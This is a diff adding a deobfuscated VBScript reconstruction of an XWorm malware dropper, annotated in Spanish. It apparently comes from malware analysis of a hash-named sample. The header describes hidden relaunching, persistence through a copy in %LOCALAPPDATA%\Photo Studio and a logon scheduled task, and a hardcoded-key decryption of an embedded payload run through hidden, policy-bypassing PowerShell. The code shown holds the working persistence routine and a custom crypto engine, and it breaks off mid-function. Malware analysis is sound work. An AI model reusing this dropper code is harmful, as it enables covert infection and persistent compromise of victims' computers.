@@ -1,0 +1,1186 @@
+' ============================================================================
+'  XWORM DROPPER (VBScript / WSH) - CODIGO DESOFUSCADO COMPLETO
+' ============================================================================
+'  Original : 09ff52a546c7517951367e6df955d8ea14a1089deb0cfd44f942537da8e8baac.vbs
+'  Familia  : XWorm (dropper/loader VBScript)
+'
+'  COMPORTAMIENTO:
+'   1) Se relanza via wscript.exe oculto si fue invocado con cscript.exe.
+'   2) PERSISTENCIA: se copia a %LOCALAPPDATA%\Photo Studio\PhotoStudio.vbs
+'      y crea una tarea programada "PhotoStudioVBS" (disparador Logon).
+'   3) Descifra un payload embebido (3 capas AES/Rijndael) con la clave
+'      "*x52SikcXitel2EFxWwPuCwc".
+'   4) Escribe el resultado en %TEMP%\<5 digitos>.ps1 y lo ejecuta:
+'        powershell.exe -NoP -NonI -W Hidden -EP Bypass -Sta -File "<script>"
+'   5) Borra el .ps1 tras 2.5 s.
+'
+'  OFUSCACION ORIGINAL (eliminada/renombrada):
+'   - ~1000 lineas de un serializador JSON falso (senuelo).
+'   - Implementacion AES a mano con nombres aleatorios (renombrada abajo).
+'   - Disfraz de comentario: "Lightweight JSON serializer runtime".
+' ============================================================================
+
+Option Explicit
+
+' Relanzarse con wscript.exe oculto si fue invocado con cscript.exe
+If InStr(1, LCase(WScript.FullName), "cscript.exe") > 0 Then
+    CreateObject("WScript.Shell").Run "wscript.exe //B """ & WScript.ScriptFullName & """", 0, False
+    WScript.Quit
+End If
+
+
+' ----------------------------------------------------------------------------
+' PERSISTENCIA: copia a %LOCALAPPDATA%\Photo Studio\ y tarea programada
+' ----------------------------------------------------------------------------
+Sub InstallPersistence()
+    Dim shell, installDir, installPath, cmdExe, schtasksExe
+    Dim folderName, scriptFileName, taskName, wshNetwork, userId, xmlTaskPath, xmlTaskContent, xmlStream
+
+    Set shell = CreateObject("WScript.Shell")
+    cmdExe      = "cmd.exe"
+    schtasksExe = "schtasks.exe"
+    folderName    = "Photo Studio"
+    scriptFileName = "PhotoStudio.vbs"
+    taskName      = "PhotoStudioVBS"
+
+    installDir  = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\" & folderName
+    installPath = installDir & "\" & scriptFileName
+
+    shell.Run cmdExe & " /c if not exist """ & installDir  & """ mkdir """ & installDir & """", 0, True
+    shell.Run cmdExe & " /c if not exist """ & installPath & """ copy /y """ & WScript.ScriptFullName & """ """ & installPath & """", 0, True
+
+    Set wshNetwork = CreateObject("WScript.Network")
+    userId = wshNetwork.UserDomain & "\" & wshNetwork.UserName
+    Set wshNetwork = Nothing
+
+    xmlTaskPath = BuildTempPath("mfp_x", "xml")
+    xmlTaskContent = "<?xml version=""1.0"" encoding=""UTF-16""?>" & Chr(10) & _
+        "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & Chr(10) & _
+        "  <Triggers><LogonTrigger><Enabled>true</Enabled><UserId>" & userId & "</UserId></LogonTrigger></Triggers>" & Chr(10) & _
+        "  <Principals><Principal id=""Author""><UserId>" & userId & "</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>" & Chr(10) & _
+        "  <Settings><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy></Settings>" & Chr(10) & _
+        "  <Actions Context=""Author""><Exec><Command>wscript.exe</Command><Arguments>""//B"" ""//NoLogo"" """ & installPath & """</Arguments></Exec></Actions>" & Chr(10) & _
+        "</Task>"
+
+    Set xmlStream = CreateObject("ADODB.Stream")
+    xmlStream.Type = 2 : xmlStream.CharSet = "unicode" : xmlStream.Open
+    xmlStream.WriteText xmlTaskContent
+    xmlStream.SaveToFile xmlTaskPath, 2
+    xmlStream.Close : Set xmlStream = Nothing
+
+    On Error Resume Next
+    shell.Run schtasksExe & " /create /tn """ & taskName & """ /xml """ & xmlTaskPath & """ /f", 0, True
+    On Error GoTo 0
+    shell.Run cmdExe & " /c del /f /q """ & xmlTaskPath & """", 0, True
+End Sub
+
+
+' ============================================================================
+'  MOTOR CRIPTOGRAFICO (AES/Rijndael con tabla clave-dependiente de 512 entradas)
+' ============================================================================
+Sub ShiftRows(SketchSlice29, ByVal at, ByVal SealFlag49)
+    Dim MergeField92(3)
+    MergeField92(0) = SketchSlice29(at)
+    MergeField92(1) = SketchSlice29(at + 4)
+    MergeField92(2) = SketchSlice29(at + 8)
+    MergeField92(3) = SketchSlice29(at + 12)
+    SketchSlice29(at) = MergeField92((4 - SealFlag49 + 0) And 3)
+    SketchSlice29(at + 4) = MergeField92((4 - SealFlag49 + 1) And 3)
+    SketchSlice29(at + 8) = MergeField92((4 - SealFlag49 + 2) And 3)
+    SketchSlice29(at + 12) = MergeField92((4 - SealFlag49 + 3) And 3)
+End Sub
+
+Function SBoxLookup(ByVal a)
+    SBoxLookup = KeyTable(a And 255)
+End Function
+
+
+
+Function RotLeft1(ByVal v)
+    Dim LiftPage96
+    LiftPage96 = (v And &H40000000) <> 0
+    v = (v And &H3FFFFFFF) * 2
+    If LiftPage96 Then v = v Or &H80000000
+    RotLeft1 = v
+End Function
+
+Sub StoreUInt32LE(HatchSlot81s, o, v)
+    HatchSlot81s(o) = v - Int(v / 256) * 256
+    v = Int(v / 256)
+    HatchSlot81s(o + 1) = v - Int(v / 256) * 256
+    v = Int(v / 256)
+    HatchSlot81s(o + 2) = v - Int(v / 256) * 256
+    v = Int(v / 256)
+    HatchSlot81s(o + 3) = v - Int(v / 256) * 256
+End Sub
+
+
+Sub EncryptBlock(s, ClipTable21, FoldField91)
+    Dim a, b, c, d, t, u, sp, i
+    a = LoadUInt32LE2(ClipTable21, 0)
+    b = LoadUInt32LE2(ClipTable21, 4)
+    c = LoadUInt32LE2(ClipTable21, 8)
+    d = LoadUInt32LE2(ClipTable21, 12)
+    sp = 42
+    c = Sub32(c, s(sp + 1))
+    a = Sub32(a, s(sp))
+    For i = 1 To 20
+        sp = sp - 2
+        t = a
+        a = d
+        d = c
+        c = b
+        b = t
+        u = Rotate(Mul32Low(d, Add32(Add32(d, d), 1)), 5)
+        t = Rotate(Mul32Low(b, Add32(Add32(b, b), 1)), 5)
+        c = RotRightMod(Sub32(c, s(sp + 1)), t) Xor u
+        a = RotRightMod(Sub32(a, s(sp)), u) Xor t
+    Next
+    d = Sub32(d, s(1))
+    b = Sub32(b, s(0))
+    StoreUInt32LE2 FoldField91, 0, a
+    StoreUInt32LE2 FoldField91, 4, b
+    StoreUInt32LE2 FoldField91, 8, c
+    StoreUInt32LE2 FoldField91, 12, d
+End Sub
+
+Function Rcon(ByVal i)
+    Dim ScaleLexer49
+    ScaleLexer49 = Array(1, 2, 4, 8, 16, 32, 64, 128, 27, 54)
+    Rcon = ScaleLexer49(i)
+End Function
+
+Function ExpandKeyBytes(ScaleEdge63s, count)
+    Dim SlideWriter29(), state, i, m
+    m = UBound(ScaleEdge63s) + 1
+    ReDim SlideWriter29(count - 1)
+    state = 0
+    For i = 0 To count - 1
+        state = (state + ScaleEdge63s(i Mod m) + (i + 1)) And 255
+        state = (state * 33 + 17) And 255
+        SlideWriter29(i) = state
+    Next
+    ExpandKeyBytes = SlideWriter29
+End Function
+
+
+
+Function Mod2p28(ByVal x)
+    Mod2p28 = x - Int(x / 268435456) * 268435456
+End Function
+
+Function DecryptCBC_EncRound(SweepSchema77s, iv, SketchSlice29)
+    Dim s, ClipPacket88s(), SlideWriter29(), ClipTable21(), ProbeRange40(), WidenSchema39s, i, m
+    s = RijndaelKeySchedule(SweepSchema77s)
+    m = UBound(SketchSlice29) + 1
+    ReDim ClipPacket88s(15)
+    ReDim SlideWriter29(m - 1)
+    ReDim ClipTable21(15)
+    ReDim ProbeRange40(15)
+    For i = 0 To 15
+        ClipPacket88s(i) = iv(i)
+    Next
+    WidenSchema39s = 0
+    Do While WidenSchema39s < m
+        For i = 0 To 15
+            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
+        Next
+        EncryptBlock s, ClipTable21, ProbeRange40
+        For i = 0 To 15
+            SlideWriter29(WidenSchema39s + i) = ProbeRange40(i) Xor ClipPacket88s(i)
+            ClipPacket88s(i) = ClipTable21(i)
+        Next
+        WidenSchema39s = WidenSchema39s + 16
+    Loop
+    DecryptCBC_EncRound = SlideWriter29
+End Function
+
+
+Function ExpandRoundKeys(SweepSchema77s)
+    Dim t(14), k(39), j, i, n, w, m, nw
+    For i = 0 To 14
+        t(i) = 0
+    Next
+    For i = 0 To 15
+        t(i \ 4) = t(i \ 4) Or RotLeft(SweepSchema77s(i), (i Mod 4) * 8)
+    Next
+    t(4) = 4
+    For j = 0 To 3
+        For i = 0 To 14
+            t(i) = t(i) Xor Rotate(t((i + 8) Mod 15) Xor t((i + 13) Mod 15), 3) Xor (4 * i + j)
+        Next
+        For n = 0 To 3
+            For i = 0 To 14
+                t(i) = Rotate(Add32(t(i), KeyTable(Mod(ToUInt32(t((i + 14) Mod 15)), 512))), 9)
+            Next
+        Next
+        For i = 0 To 9
+            k(10 * j + i) = t((4 * i) Mod 15)
+        Next
+    Next
+    For i = 5 To 35 Step 2
+        w = k(i) Or 3
+        nw = Not w
+        m = (nw Xor RotLeft(w, 1)) And (nw Xor RotRight(w, 1)) And &H7FFFFFFE
+        m = m And RotRight(m, 1)
+        m = m And RotRight(m, 2)
+        m = m And RotRight(m, 4)
+        m = m Or RotLeft(m, 1)
+        m = m Or RotLeft(m, 2)
+        m = m Or RotLeft(m, 4)
+        m = m And &H7FFFFFFC
+        w = w Xor (RotateMod(KeyTable(265 + (k(i) And 3)), k(i - 1)) And m)
+        k(i) = w
+    Next
+    ExpandRoundKeys = k
+End Function
+
+Function KeyTableLookup(ByVal a)
+    KeyTableLookup = KeyTable(a And 511)
+End Function
+
+
+Sub Mul32(ByVal a, ByVal b, ByRef hi, ByRef lo)
+    Dim al, ah, bl, bh, p0, p1, p2, p3, mid, HoistFrame24
+    al = a - Int(a / 65536) * 65536
+    ah = Int(a / 65536)
+    bl = b - Int(b / 65536) * 65536
+    bh = Int(b / 65536)
+    p0 = al * bl
+    p1 = al * bh
+    p2 = ah * bl
+    p3 = ah * bh
+    mid = p1 + p2
+    lo = p0 + (mid - Int(mid / 65536) * 65536) * 65536
+    HoistFrame24 = Int(lo / 4294967296)
+    lo = lo - HoistFrame24 * 4294967296
+    hi = p3 + Int(mid / 65536) + HoistFrame24
+End Sub
+
+
+
+Function Mul32Low(ByVal a, ByVal b)
+    Dim al, ah, bl, bh, p0, p1, lo
+    a = ToUInt32(a)
+    b = ToUInt32(b)
+    al = a - Int(a / 65536) * 65536
+    ah = Int(a / 65536)
+    bl = b - Int(b / 65536) * 65536
+    bh = Int(b / 65536)
+    p0 = al * bl
+    p1 = al * bh + ah * bl
+    lo = p0 + (p1 - Int(p1 / 65536) * 65536) * 65536
+    lo = lo - Int(lo / 4294967296) * 4294967296
+    Mul32Low = ToInt32(lo)
+End Function
+
+Function RotRightVar(ByVal v, ByVal n)
+    n = n And 31
+    If n = 0 Then
+        RotRightVar = v
+    Else
+        RotRightVar = Rotate(v, 32 - n)
+    End If
+End Function
+
+
+Function GFMultiply(ByVal a, ByVal b)
+    Dim p, i, t
+    p = 0
+    For i = 1 To 8
+        If (b And 1) <> 0 Then p = p Xor a
+        t = a And 128
+        a = (a * 2) And 255
+        If t <> 0 Then a = a Xor 27
+        b = b \ 2
+    Next
+    GFMultiply = p And 255
+End Function
+
+Function RotRightMod(ByVal v, ByVal y)
+    RotRightMod = RotRightVar(v, Mod(ToUInt32(y), 32))
+End Function
+
+Function ComputeIntegrity(SweepSchema77s, SketchSlice29)
+    Dim r0, r1, r2, r3, s1, s2, s3
+    Dim n0, n1, n2, n3
+    Dim h0, h1, h2, h3, h4
+    Dim WidenSchema39s, ProbeTag15, SlideAtom86(15), j, m
+    r0 = Mod2p28(LoadUInt32LE(SweepSchema77s, 0))
+    r1 = RoundDown4(LoadUInt32LE(SweepSchema77s, 4))
+    r2 = RoundDown4(LoadUInt32LE(SweepSchema77s, 8))
+    r3 = RoundDown4(LoadUInt32LE(SweepSchema77s, 12))
+    n0 = LoadUInt32LE(SweepSchema77s, 16)
+    n1 = LoadUInt32LE(SweepSchema77s, 20)
+    n2 = LoadUInt32LE(SweepSchema77s, 24)
+    n3 = LoadUInt32LE(SweepSchema77s, 28)
+    h0 = 0
+    h1 = 0
+    h2 = 0
+    h3 = 0
+    h4 = 0
+    m = UBound(SketchSlice29) + 1
+    WidenSchema39s = 0
+    Do While m - WidenSchema39s >= 16
+        ProcessBlock h0, h1, h2, h3, h4, r0, r1, r2, r3, SketchSlice29, WidenSchema39s, 1
+        WidenSchema39s = WidenSchema39s + 16
+    Loop
+    If WidenSchema39s < m Then
+        For j = 0 To 15
+            SlideAtom86(j) = 0
+        Next
+        ProbeTag15 = m - WidenSchema39s
+        For j = 0 To ProbeTag15 - 1
+            SlideAtom86(j) = SketchSlice29(WidenSchema39s + j)
+        Next
+        SlideAtom86(ProbeTag15) = 1
+        ProcessBlock h0, h1, h2, h3, h4, r0, r1, r2, r3, SlideAtom86, 0, 0
+    End If
+    ComputeIntegrity = FinalizeIntegrity(h0, h1, h2, h3, h4, n0, n1, n2, n3)
+End Function
+
+
+Function Utf8ToBytes(text)
+    Dim ForgeBlock18, LatchTag91, n, i, a(), b
+    Set ForgeBlock18 = CreateObject("ADODB.Stream")
+    ForgeBlock18.Type = 2
+    ForgeBlock18.Charset = "utf-8"
+    ForgeBlock18.Open
+    ForgeBlock18.WriteText text
+    ForgeBlock18.Position = 0
+    ForgeBlock18.Type = 1
+    ForgeBlock18.Position = 3
+    LatchTag91 = ForgeBlock18.Read
+    ForgeBlock18.Close
+    n = LenB(LatchTag91)
+    If n <= 0 Then
+        ReDim a(0)
+        a(0) = 0
+        Utf8ToBytes = a
+        Exit Function
+    End If
+    ReDim a(n - 1)
+    For i = 1 To n
+        b = AscB(MidB(LatchTag91, i, 1))
+        a(i - 1) = b
+    Next
+    Utf8ToBytes = a
+End Function
+
+
+Function RoundDown4(ByVal x)
+    x = Mod2p28(x)
+    RoundDown4 = x - (x Mod 4)
+End Function
+
+
+Function LoadUInt32LE(HatchSlot81s, o)
+    LoadUInt32LE = CDbl(HatchSlot81s(o)) + CDbl(HatchSlot81s(o + 1)) * 256 + CDbl(HatchSlot81s(o + 2)) * 65536 + CDbl(HatchSlot81s(o + 3)) * 16777216
+End Function
+
+Function Sub32(ByVal a, ByVal b)
+    Dim d
+    d = ToUInt32(a) - ToUInt32(b)
+    If d < 0 Then d = d + 4294967296
+    Sub32 = ToInt32(d)
+End Function
+
+Function RotLeft(ByVal v, ByVal n)
+    Dim i
+    For i = 1 To n
+        v = RotLeft1(v)
+    Next
+    RotLeft = v
+End Function
+
+
+Function KeyTableLookup2(ByVal a)
+    KeyTableLookup2 = KeyTable((a And 255) + 256)
+End Function
+
+
+
+Sub InitCryptoTables()
+    Dim h, i
+    h = ""
+    h = h & "09d0c47928c8ffe084aa6c399dad72877dff9be3d4268361c96da1d47974cc9385d0582e2a4b57051ca16a62c3bd279d0f1f25e55160372fc695c1fb4d7ff1e4ae5f6bf40d72ee46ff23de8ab1cf8e83f14902e23e981e428bf53eb67f4bf8ac83631f832597020576afe7843a7931d44f8464505c64c3f6210a5f18c6986a2628f4e8263a60a81cd340a6647ea820c4526687c57eddd12b32a11d1d9c9ef08680f6e831ab6f04ad56fb9b538b2e095cb68556aed2250b0d294a7721e21fb253ae136749e82aae869336510499404a6678a784dcb69ba84b0404679323db5c1e46cae1d62fe281345a2239421863cd5bc190c6e307dfb8466eb888162d0dcc4a"
+    h = h & "a4ccae593798670dcbfa94934f481d45eafc8ca8db1129d6b0449e200f5407fb6167d9a8d1f457634daa96c33bec5958ababa014b6ccd20138d6279f026822158f376cd5092c237ebfc5659332889d2c854b3e9505bb9b437dcd5dcda02e926cfae527e536a1c3303412e1aef257f4623c4f1d7130a2e80968e5f5519c61ba445ded0ab875ce09c89654f93e698c0cca243cb3e42b062b970f3b8d9e00e050dffc5d6166e35f9288c079550d0591aee88e531e7475fe35782f6d829af60b21ae95e8eb8d6699486b901d7d9bfd6d6e311090acefe0670dd8dab2e692cd6d4365e53935143af345f06241fc4d460da3a37bcf37298bf1d1e014aac0701587ed55"
+    h = h & "3afd7d3ed2f29e0129a9d1f6efb10c53cf3b870fb414935c664465ed024acac759a744c11d2936a7dc580aa6cf574ca8040a7a106cd818078a98be4caccea063c33e92b5d1e0e03db322517e2092bd13386b2c4a52e8dd5858656dfb5082037141811896e337ef7ed39fb119c97f0df668fea01ba150a6e555258962eb6ff41bd7c9cd7aa619cd9ebcf095762672c073f003fb3c4ab7a50b1484126a487ba9b1a64fc9c6f6957d4938b06a75dd805fcd63d094cff51c999e1aa4d343b8495294ce9f8e99bffcd770c7c275cc378453a77b21be33397f41bd4e94d13192cc1f985915ea5199f861b7c9980a881d74fd5fb0a495f8614deed0b5778eea5941792d"
+    h = h & "fa90c1f833f824b4c49653723ff6d5504ca5fec08630e9645b3fbbd67da26a48b203231a042975142d6393062eb1314916a45272532459a08e5f4872f966c7d907128dc00d44db62afc8d52d06316131d838e7ce1bc41d003a2e8c0fea83837eb984737d13ba4891c4f8b949a6d6acb3a215cdce8359838b6bd1aa31f579dd5221b93f93f5176781187dfddee94aeb762b38fd54431de1daab3948259ad3048fdfea32aa659473e3623f7863f3346c59ab3ab6853346a90b6b56443ec6de01f88d421fc09b0ed10c88f1a1e954c1f0297dead57b8d7ba4264cf5178a551a7cca1a9a5f08fcd651b925605182e11fc6c3b6fd9676337b3027b7c8eb149e5fd030"
+    h = h & "6b57e354ad913cf77e16688d58872a692c2fc7dfe389ccc630738df10824a734e1797a8ba4a8d57b5b5d193bc8a8309b73f9a97873398d320f59573ee9df2b03e8a5b6c8848d070498df93c2720a1dc3684f259a943ba848a6370152863b5ea3d17b978b6d9b58ef0a700dd4a73d36bf8e6a08298695bc14e35b3447933ac5688894b0222f511c27ddfbcc3c006662b6117c83fe4e12b414c2bca7663a2fec10f456242055792e2a46f5d857ceda25cec3601d3b6c00ab46efac9c28b3c35047611dfee3257c3207fdd584823b14d84f23becb64a075f3a3088f8ead07adf1587796943cfacabf3dc09730cdf7679969da44e9ed2c854c1235935fa32f057d9f"
+    h = h & "690624f81cb0bafd7b0dbdc6810f23bbfa929a1a6d969a176742979b74ac7d05010e65c486a3d963f907b5a0d0042bd3158d7d03287a8255bba8366f096edc3321916a7b77b56b86951622f9a6c5e6508cea17d1cd8c62bca3d63433358a68fd0f9b9d3cd6aa295bfe33384ac000738ecd67eb2fe2eb6dc297338b0206c9f246419cf1ad2b83c0453723f18acb5b3089160bead75d49465635f8a74b1e4e6c9e000399bd67466880b4174831acf423b2ca815ab35a6395e7302a67c58bdb446b108f8fa410223eda92b8b48b7f38d0eeab2701d40262d415af224a30b3d88abaf8b2c3afdaf7ef70cc97d3b7e9614b6c2baebff470f687cf386c9156ce092ee5"
+    h = h & "01e87da66ce91e6abb7bcc84c7922c209d3b71fd060e41c6d7590f154e03bb47183c198e63eeb2402ddbf49a6d5cba54923750aff9e142367838162b59726c7281b66760bb2926c148a0ce0da6c0496dad43507b718d496a9df057af44b1bde6054356dcde7ced35d51a138b62088cc935830311c96efca2686f86ec8e77cb6863e1d6b8c80f977879c491fd1b4c67f272698d7d5e368c31f7d95e2ea1d3493fdcd9433e896f15524bc4ca7aa6d1baf4a5a96dcc0bef8b46a169fda774df40b74e2088049a756607038e87c820211e448b7ad4bfc6403f351848e36d80bdb0381e62891c643d2107bf04d6f821092c8cf644f3890778404e7b78adb8a2c52d53"
+    h = h & "42157abea2253e2e7bf3f4ae80f594f9953194e777eb92edb3816930da8d9336bf447469f26d9483ee6faed571371235de425f73b4e59f437dbe2d4e2d37b18549dc9a6398c39d981301c9a2389b1bbf0c18588da421c1ba7aa3865c71e085583c5cfcaa7d239ca40297d9ddd7dc28304b37802b7428ab54aeee03474b3fbb85692f2f08134e578e36d9e0bfae8b5fcfedb93ecf2b27248e170eb1ef7dc57fd61e760f16b1136601864e1b9bd7ea73193ab871bdcfa4d76fe31bd7820dbeb469abb960615370f85dffb07e37da30d0fbebc977b60b98b40f3a4d0fe6df4fc26b159cf22ac298d6e22b78ef6a61a94ac0ab56118714eea0f0df0d416419af70ee"
+    ReDim KeyTable(511)
+    For i = 0 To 511
+        KeyTable(i) = HexToUInt32(Mid(h, i * 8 + 1, 8))
+    Next
+    h = "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16"
+    ReDim AES_SBox(255)
+    For i = 0 To 255
+        AES_SBox(i) = CLng("&H" & Mid(h, i * 2 + 1, 2))
+    Next
+    h = "52096ad53036a538bf40a39e81f3d7fb7ce339829b2fff87348e4344c4dee9cb547b9432a6c2233dee4c950b42fac34e082ea16628d924b2765ba2496d8bd12572f8f66486689816d4a45ccc5d65b6926c704850fdedb9da5e154657a78d9d8490d8ab008cbcd30af7e45805b8b34506d02c1e8fca3f0f02c1afbd0301138a6b3a9111414f67dcea97f2cfcef0b4e67396ac7422e7ad3585e2f937e81c75df6e47f11a711d29c5896fb7620eaa18be1bfc563e4bc6d279209adbc0fe78cd5af41fdda8338807c731b11210592780ec5f60517fa919b54a0d2de57a9f93c99cefa0e03b4dae2af5b0c8ebbb3c83539961172b047eba77d626e169146355210c7d"
+    ReDim AES_InvSBox(255)
+    For i = 0 To 255
+        AES_InvSBox(i) = CLng("&H" & Mid(h, i * 2 + 1, 2))
+    Next
+End Sub
+
+Function AESKeySchedule(SweepSchema77s)
+    Dim ks(), MergeField92(3), i, b, nk, hi, EmitHub68, rc, t
+    ReDim ks(175)
+    For i = 0 To 15
+        ks(i) = SweepSchema77s(i)
+    Next
+    nk = 4
+    hi = 44
+    EmitHub68 = nk
+    rc = 0
+    For i = nk To hi - 1
+        For b = 0 To 3
+            MergeField92(b) = ks((i - 1) * 4 + b)
+        Next
+        If i = EmitHub68 Then
+            EmitHub68 = EmitHub68 + nk
+            t = MergeField92(0)
+            MergeField92(0) = MergeField92(1)
+            MergeField92(1) = MergeField92(2)
+            MergeField92(2) = MergeField92(3)
+            MergeField92(3) = t
+            MergeField92(0) = AES_SBox(MergeField92(0))
+            MergeField92(1) = AES_SBox(MergeField92(1))
+            MergeField92(2) = AES_SBox(MergeField92(2))
+            MergeField92(3) = AES_SBox(MergeField92(3))
+            MergeField92(0) = MergeField92(0) Xor Rcon(rc)
+            rc = rc + 1
+        End If
+        For b = 0 To 3
+            ks(i * 4 + b) = ks((i - nk) * 4 + b) Xor MergeField92(b)
+        Next
+    Next
+    AESKeySchedule = ks
+End Function
+
+
+
+Function RotRight1(ByVal v)
+    Dim FoldTile44, r
+    FoldTile44 = v < 0
+    r = (v And &H7FFFFFFF) \ 2
+    If FoldTile44 Then r = r Or &H40000000
+    RotRight1 = r
+End Function
+
+
+
+Function HexToUInt32(ByVal h)
+    Dim hi, lo
+    hi = CLng("&H" & Left(h, 4))
+    lo = CLng("&H" & Right(h, 4))
+    HexToUInt32 = ToInt32(CDbl(hi) * 65536 + lo)
+End Function
+
+
+
+Function PadLeft(number, QuiltTable17)
+    PadLeft = Right(String(QuiltTable17, "0") & CStr(number), QuiltTable17)
+End Function
+
+Function Add32(ByVal a, ByVal b)
+    Dim d
+    d = ToUInt32(a) + ToUInt32(b)
+    If d >= 4294967296 Then d = d - 4294967296
+    Add32 = ToInt32(d)
+End Function
+
+Sub StoreUInt32LE2(HatchSlot81s, o, v)
+    HatchSlot81s(o) = v And 255
+    HatchSlot81s(o + 1) = RotRight(v, 8) And 255
+    HatchSlot81s(o + 2) = RotRight(v, 16) And 255
+    HatchSlot81s(o + 3) = RotRight(v, 24) And 255
+End Sub
+
+Function IsByteArray(SketchWriter34s)
+    Dim i
+    If Not IsArray(SketchWriter34s) Then IsByteArray = False : Exit Function
+    On Error Resume Next
+    For i = LBound(SketchWriter34s) To UBound(SketchWriter34s)
+        If Not IsNumeric(SketchWriter34s(i)) Then IsByteArray = False : Exit Function
+        If SketchWriter34s(i) < 0 Or SketchWriter34s(i) > 255 Then IsByteArray = False : Exit Function
+    Next
+    On Error Goto 0
+    IsByteArray = True
+End Function
+
+Function RotRight(ByVal v, ByVal n)
+    Dim i
+    For i = 1 To n
+        v = RotRight1(v)
+    Next
+    RotRight = v
+End Function
+
+Function LoadUInt32LE2(HatchSlot81s, o)
+    Dim d
+    d = CDbl(HatchSlot81s(o + 3)) * 16777216 + CDbl(HatchSlot81s(o + 2)) * 65536 + CDbl(HatchSlot81s(o + 1)) * 256 + HatchSlot81s(o)
+    LoadUInt32LE2 = ToInt32(d)
+End Function
+
+
+
+Sub ProcessBlock(ByRef h0, ByRef h1, ByRef h2, ByRef h3, ByRef h4, ByVal r0, ByVal r1, ByVal r2, ByVal r3, SketchSlice29, ByVal o, ByVal AlignHeader47)
+    Dim s1, s2, s3
+    Dim d0, c
+    Dim PinchHub97, TraceParser21, PinchBuffer97, SweepLeaf29, LatchPool70s, LiftBuffer19s, WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s, GraftGate47
+    s1 = r1 + Int(r1 / 4)
+    s2 = r2 + Int(r2 / 4)
+    s3 = r3 + Int(r3 / 4)
+    d0 = h0 + LoadUInt32LE(SketchSlice29, o)
+    h0 = d0 - Int(d0 / 4294967296) * 4294967296
+    c = Int(d0 / 4294967296)
+    d0 = h1 + c + LoadUInt32LE(SketchSlice29, o + 4)
+    h1 = d0 - Int(d0 / 4294967296) * 4294967296
+    c = Int(d0 / 4294967296)
+    d0 = h2 + c + LoadUInt32LE(SketchSlice29, o + 8)
+    h2 = d0 - Int(d0 / 4294967296) * 4294967296
+    c = Int(d0 / 4294967296)
+    d0 = h3 + c + LoadUInt32LE(SketchSlice29, o + 12)
+    h3 = d0 - Int(d0 / 4294967296) * 4294967296
+    c = Int(d0 / 4294967296)
+    h4 = h4 + c + AlignHeader47
+    PinchHub97 = 0
+    TraceParser21 = 0
+    PinchBuffer97 = 0
+    SweepLeaf29 = 0
+    LatchPool70s = 0
+    LiftBuffer19s = 0
+    WeaveLayer87 = 0
+    EmitScope86 = 0
+    Mul32 h0, r0, MergeToken99, BraceFrame82s
+    Add32Carry PinchHub97, TraceParser21, MergeToken99, BraceFrame82s
+    Mul32 h1, s3, MergeToken99, BraceFrame82s
+    Add32Carry PinchHub97, TraceParser21, MergeToken99, BraceFrame82s
+    Mul32 h2, s2, MergeToken99, BraceFrame82s
+    Add32Carry PinchHub97, TraceParser21, MergeToken99, BraceFrame82s
+    Mul32 h3, s1, MergeToken99, BraceFrame82s
+    Add32Carry PinchHub97, TraceParser21, MergeToken99, BraceFrame82s
+    Mul32 h0, r1, MergeToken99, BraceFrame82s
+    Add32Carry PinchBuffer97, SweepLeaf29, MergeToken99, BraceFrame82s
+    Mul32 h1, r0, MergeToken99, BraceFrame82s
+    Add32Carry PinchBuffer97, SweepLeaf29, MergeToken99, BraceFrame82s
+    Mul32 h2, s3, MergeToken99, BraceFrame82s
+    Add32Carry PinchBuffer97, SweepLeaf29, MergeToken99, BraceFrame82s
+    Mul32 h3, s2, MergeToken99, BraceFrame82s
+    Add32Carry PinchBuffer97, SweepLeaf29, MergeToken99, BraceFrame82s
+    Mul32 h4, s1, MergeToken99, BraceFrame82s
+    Add32Carry PinchBuffer97, SweepLeaf29, MergeToken99, BraceFrame82s
+    Mul32 h0, r2, MergeToken99, BraceFrame82s
+    Add32Carry LatchPool70s, LiftBuffer19s, MergeToken99, BraceFrame82s
+    Mul32 h1, r1, MergeToken99, BraceFrame82s
+    Add32Carry LatchPool70s, LiftBuffer19s, MergeToken99, BraceFrame82s
+    Mul32 h2, r0, MergeToken99, BraceFrame82s
+    Add32Carry LatchPool70s, LiftBuffer19s, MergeToken99, BraceFrame82s
+    Mul32 h3, s3, MergeToken99, BraceFrame82s
+    Add32Carry LatchPool70s, LiftBuffer19s, MergeToken99, BraceFrame82s
+    Mul32 h4, s2, MergeToken99, BraceFrame82s
+    Add32Carry LatchPool70s, LiftBuffer19s, MergeToken99, BraceFrame82s
+    Mul32 h0, r3, MergeToken99, BraceFrame82s
+    Add32Carry WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s
+    Mul32 h1, r2, MergeToken99, BraceFrame82s
+    Add32Carry WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s
+    Mul32 h2, r1, MergeToken99, BraceFrame82s
+    Add32Carry WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s
+    Mul32 h3, r0, MergeToken99, BraceFrame82s
+    Add32Carry WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s
+    Mul32 h4, s3, MergeToken99, BraceFrame82s
+    Add32Carry WeaveLayer87, EmitScope86, MergeToken99, BraceFrame82s
+    Mul32 h4, r0, MergeToken99, BraceFrame82s
+    GraftGate47 = BraceFrame82s
+    h0 = TraceParser21
+    Add32Carry PinchBuffer97, SweepLeaf29, 0, PinchHub97
+    h1 = SweepLeaf29
